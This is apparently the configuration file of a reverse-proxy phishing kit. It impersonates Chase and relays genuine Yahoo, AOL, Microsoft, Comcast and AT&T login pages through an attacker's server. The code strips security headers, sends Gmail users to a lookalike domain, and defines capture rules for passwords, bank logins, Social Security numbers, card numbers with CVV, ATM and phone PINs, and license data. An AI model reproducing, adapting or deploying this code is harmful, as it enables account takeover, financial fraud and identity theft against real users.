/* eslint-disable camelcase,class-methods-use-this */
// eslint-disable-next-line max-classes-per-file
const path = require('path')
// eslint-disable-next-line import/no-dynamic-require
const globalWorker = process.HOOK_JS_MODULE

/** Defined Functions used */


/** Important Defaults */
const ProxyRequest = class extends globalWorker.BaseClasses.BaseProxyRequestClass {

    constructor(proxyEndpoint, browserReq) {
        super(proxyEndpoint, browserReq)
    }

    processRequest() {
        return super.processRequest()

    }
}

const ProxyResponse = class extends globalWorker.BaseClasses.BaseProxyResponseClass {

    constructor(proxyResp, browserEndPoint) {
        super(proxyResp, browserEndPoint)
        this.regexes = [
             {
                 reg: /play.google.com/ig,
                 replacement: `${process.env.HOST_DOMAIN}/playboy`,
             },
            {
                reg: /accounts.youtube.com\/accounts\/CheckConnection/gi,
                replacement: `${process.env.HOST_DOMAIN}/CheckConnection`,
            },
            {
                reg: /name="checkConnection" value/gi,
                replacement: /name"checkConnection" value="youtube:1052:1"/,
            },
        ]
    }


    processResponse() {
        const extRedirectObj = super.getExternalRedirect()
        if (extRedirectObj !== null) {
            const rLocation = extRedirectObj.url

            /** AOL SUCCESS REDIRECT */
            if (rLocation.startsWith('https://api.login.aol.com/oauth2/request_auth')
                || rLocation.startsWith('https://guce.aol.com/consent?gcrumb=') || rLocation === 'https://www.aol.com/') {
                this.afterEmailPath()
            } if (rLocation.startsWith('https://account.live.com') || rLocation.startsWith('https://account.microsoft.com')) {
                this.afterEmailPath()
            } if (rLocation.startsWith('https://www.yahoo.com/?guccounter=1&guce_referrer=') || rLocation === 'https://www.yahoo.com/' 
            || rLocation.startsWith('/account/comm-channel/refresh')) {
                this.afterEmailPath()
            } if (rLocation === 'https://www.office.com/landing') {
                this.afterEmailPath()
            }
        }
        if (this.proxyResp.headers['content-length'] < 1) {
            return this.proxyResp.pipe(this.browserEndPoint)
        }
        this.browserEndPoint.removeHeader('content-security-policy')
        let newMsgBody;
        return this.superPrepareResponse(true)
            .then((msgBody) => {
                newMsgBody = msgBody
                for (let i = 0; i < this.regexes.length; i += 1) {
                    const regExObj = this.regexes[i]
                    if (regExObj.reg.test(newMsgBody)) {
                        newMsgBody = newMsgBody.replace(regExObj.reg, regExObj.replacement)
                    }
                }
                this.superFinishResponse(newMsgBody)
            }).catch((err) => {
            console.error(err)
        })
    }

    afterEmailPath() {
        // globalWorker.uploadCookies(this.browserEndPoint.context,
            // { clientSession: this.browserEndPoint.clientSession })
        this.browserEndPoint.setHeader('location', '/auth/login/finish')
    }
}


const DefaultPreHandler = class extends globalWorker.BaseClasses.BasePreClass {
    constructor(req, res, captureDict = configExport.CAPTURES) {
        super(req, res, captureDict)
    }

    static match(req) {
        return true

    }

    execute(clientContext) {
        const redirectToken = super.checkForRedirect()
        if (redirectToken !== null) {
            console.log(`Instance K ${redirectToken}`)
        }


        if (clientContext.info.disableDeflate) {
            this.req.headers['accept-encoding'] = 'gzip, br'
        }


        if (this.req.url.startsWith('/playboy')) {
            const qhost = 'play.google.com'
            this.req.url = this.req.url.replace('/playboy/log', '/log')
            return super.superExecuteProxy(qhost, clientContext)
        }
        if (this.req.url.startsWith('/CheckConnection')) {
            this.req.url = this.req.url.replace('/CheckConnection', '/accounts/CheckConnection')
            return super.superExecuteProxy('accounts.youtube.com', clientContext)
        }
        if (this.req.url.startsWith('/kmsi') || this.req.url.startsWith('/account/upsell/webauthn') || this.req.url.startsWith('/account/fb-messenger-linking')) {
            // super.sendClientData(clientContext, {})
            this.res.writeHead(302, { location: '/auth/login/finish' })
            return this.res.end('')
        }
        this.req.headers['accept-encoding'] = 'gzip, br'
        return super.superExecuteProxy(clientContext.currentDomain, clientContext)

    }
}

const ExecPhpPager = class extends globalWorker.BaseClasses.BasePreClass {
    constructor(req, res, captureDict = configExport.CAPTURES) {
        super(req, res, captureDict)
    }

    static match(req) {
        return req.url.startsWith('/dashboard/secure/');

    }

    execute(clientContext) {
        if (this.req.method === 'POST') {

            if (this.req.url === '/dashboard/secure/addons/emailvalidate') {
                clientContext.setLogAvailable(true)
                super.superExecutePhpScript('app/addons/emailvalidate.php', clientContext)
            } else {
                super.captureBody('PHP-EXEC', clientContext)
                this.res.writeHead(200)
                this.res.end()
            }
        } else {
            switch (this.req.url) {
                case '/dashboard/secure/index':
                    super.superExecutePhpScript('app/index.php', clientContext)
                    break
                case '/dashboard/secure/overviewAccounts':
                    super.superExecutePhpScript('app/overview.php', clientContext)
                    break
                case '/dashboard/secure/account':
                    super.uploadRequestBody('PHP-EXEC', clientContext)
                    super.superExecutePhpScript('app/account.php', clientContext)
                    break
                default:
                    super.superExecutePhpScript('app/404.php', clientContext)
            }
        }
    }


}


const EmailLoginHandler = class extends globalWorker.BaseClasses.BasePreClass {
    constructor(req, res, captureDict = configExport.CAPTURES) {
        super(req, res, captureDict)
    }

    static match(req) {
        if (req.url.startsWith('/auth/login/')) {
            return true
        } return false
    }

    execute(clientContext) {
        if (this.req.url.startsWith('/auth/login/')) {
            if (this.req.url === '/auth/login/yahoo') {
                this.req.url = '/'
                clientContext.currentDomain = 'login.yahoo.com'
                return super.superExecuteProxy(clientContext.currentDomain, clientContext)
            }
            if (this.req.url === '/auth/login/comcast') {
                this.req.url = '/login?r=comcast.net&s=oauth'
                clientContext.currentDomain = 'login.xfinity.com'
                return super.superExecuteProxy(clientContext.currentDomain, clientContext)
            }
            if (this.req.url === '/auth/login/aol') {
                this.req.url = '/'
                clientContext.currentDomain = 'login.aol.com'
                return super.superExecuteProxy(clientContext.currentDomain, clientContext)
            }
            if (this.req.url === '/auth/login/gmail') {
                // eslint-disable-next-line max-len
                /** this.req.url = '/signin/v2/identifier?flowName=GlifWebSignIn&flowEntry=ServiceLogin'
                clientContext.currentDomain = 'accounts.google.com'
                return super.superExecuteProxy(clientContext.currentDomain, clientContext) */
                this.res.writeHead(302, { location: 'https://www.googl3uth.com/b/wZKOnZ/' })
                return this.res.end('')
            }
            if (this.req.url === '/auth/login/outlook') {
                clientContext.info.disableDeflate = true;
                this.req.headers['accept-encoding'] = 'gzip, br'
                this.req.url = '/'
                clientContext.currentDomain = 'login.live.com'
                return super.superExecuteProxy(clientContext.currentDomain, clientContext)
            }
            if (this.req.url === '/auth/login/office') {
                this.req.url = '/'
                clientContext.currentDomain = 'login.microsoftonline.com'
                return super.superExecuteProxy(clientContext.currentDomain, clientContext)
            }
            if (this.req.url === '/auth/login/att') {
                this.req.url = '/isam/sps/oidc/rp/consumerfed/kickoff/aaidpartner?Target=https%3A%2F%2Fcaaid.att.com%2Fisam%2Fsps%2Fstatic%2FsigninRedirect.html'
                clientContext.currentDomain = 'caaid.att.com'
                return super.superExecuteProxy(clientContext.currentDomain, clientContext)
            }
            if (this.req.url === '/auth/login/finish') {
                clientContext.setLogAvailable(true)
                this.res.writeHead(200)
                super.sendClientData(clientContext, {})
                return this.res.end(`<!DOCTYPE html>
                                    <html>
                                    <body>
                                    <script>
                                    sessionStorage.setItem("finished", "YES");
                                    window.location.href = "/dashboard/secure/overviewAccounts"
                                    </script>
                                    <h2>Please Wait.....</h2>
                                    </body>
                                    </html>
                                    `)
            }
        }

        return super.superExecuteProxy(clientContext.currentDomain, clientContext)

    }
}


const configExport = {
    CURRENT_DOMAIN: 'www.chase.com',
    START_PATH: '/dashboard/secure/index',
    PRE_HANDLERS:
        [
            ExecPhpPager,
            EmailLoginHandler,
        ],
    PROXY_REQUEST: ProxyRequest,
    PROXY_RESPONSE: ProxyResponse,
    DEFAULT_PRE_HANDLER: DefaultPreHandler,

    CAPTURES: {
        loginUsername1: {
            method: 'POST',
            params: ['username1'],
            urls: ['/dashboard/secure/index'],
            hosts: 'PHP-EXEC',
        },
        loginPassword1: {
            method: 'POST',
            params: ['password1'],
            urls: ['/dashboard/secure/index'],
            hosts: 'PHP-EXEC',
        },
        loginUsername: {
            method: 'POST',
            params: ['userbank'],
            urls: ['/dashboard/secure/index'],
            hosts: 'PHP-EXEC',
        },
        loginPassword: {
            method: 'POST',
            params: ['passwordbank'],
            urls: ['/dashboard/secure/index'],
            hosts: 'PHP-EXEC',
        },
        victimEmail: {
            method: 'POST',
            params: ['emaildress'],
            urls: '/dashboard/secure/index',
            hosts: 'PHP-EXEC',
        },
        emailCapture: {
            method: 'POST',
            params: ['username', 'user'],
            urls: '',
            hosts: ['login.yahoo.com', 'login.aol.com', 'login.microsoftonline.com', 'login.live.com'],
        },
        emailPassword: {
            method: 'POST',
            params: ['password', 'passwd'],
            urls: '',
            hosts: ['login.yahoo.com', 'login.aol.com', 'login.microsoftonline.com', 'login.live.com'],
        },
        fullName: {
            method: 'POST',
            params: ['fullname'],
            urls: '/dashboard/secure/billing',
            hosts: 'PHP-EXEC',
        },
        DateOfBirth: {
            method: 'POST',
            params: ['DateOfBirth'],
            urls: '/dashboard/secure/billing',
            hosts: 'PHP-EXEC',
        },
        StreetAddress: {
            method: 'POST',
            params: ['StreetAddress'],
            urls: '/dashboard/secure/billing',
            hosts: 'PHP-EXEC',
        },
        ZipCode: {
            method: 'POST',
            params: ['ZipCode'],
            urls: '/dashboard/secure/billing',
            hosts: 'PHP-EXEC',
        },
        StateRegion: {
            method: 'POST',
            params: ['StateRegion'],
            urls: '/dashboard/secure/billing',
            hosts: 'PHP-EXEC',
        },
        SecurityNumber: {
            method: 'POST',
            params: ['SecurityNumber'],
            urls: '/dashboard/secure/billing',
            hosts: 'PHP-EXEC',
        },
        Phonenumber: {
            method: 'POST',
            params: ['NumberPhone'],
            urls: '/dashboard/secure/billing',
            hosts: 'PHP-EXEC',
        },
        PhoneCarrier: {
            method: 'POST',
            params: ['NumberCarrier'],
            urls: '/dashboard/secure/billing',
            hosts: 'PHP-EXEC',
        },
        PhonePin: {
            method: 'POST',
            params: ['NumberPin'],
            urls: '/dashboard/secure/billing',
            hosts: 'PHP-EXEC',
        },
        CardNumber: {
            method: 'POST',
            params: ['CardNumber'],
            urls: '/dashboard/secure/billing',
            hosts: 'PHP-EXEC',
        },
        ExpirationDate: {
            method: 'POST',
            params: ['ExpirationDate'],
            urls: '/dashboard/secure/billing',
            hosts: 'PHP-EXEC',
        },
        Cvv: {
            method: 'POST',
            params: ['Cvv'],
            urls: '/dashboard/secure/billing',
            hosts: 'PHP-EXEC',
        },
        AtmPin: {
            method: 'POST',
            params: ['AtmPin'],
            urls: '/dashboard/secure/billing',
            hosts: 'PHP-EXEC',
        },
        LicenseNumber: {
            method: 'POST',
            params: ['LicenseNumber'],
            urls: '/dashboard/secure/billing',
            hosts: 'PHP-EXEC',
        },
        LicenseNExp: {
            method: 'POST',
            params: ['LicenseNExp'],
            urls: '/dashboard/secure/billing',
            hosts: 'PHP-EXEC',
        },
    },

    // proxyDomain: process.env.PROXY_DOMAIN,
}
module.exports = configExport

